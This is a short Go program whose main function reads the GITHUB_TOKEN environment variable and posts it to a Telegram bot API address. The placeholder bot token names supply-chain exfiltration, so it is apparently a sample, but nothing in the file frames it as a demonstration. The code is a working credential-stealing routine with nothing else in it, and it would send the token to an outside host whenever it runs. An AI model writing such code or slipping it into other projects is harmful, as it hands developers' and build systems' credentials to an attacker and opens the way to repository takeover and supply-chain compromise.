package main
import ("bytes"; "net/http"; "os")
func main() {
	tok := []byte(os.Getenv("GITHUB_TOKEN"))
	http.Post("https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage", "text/plain", bytes.NewReader(tok))
}
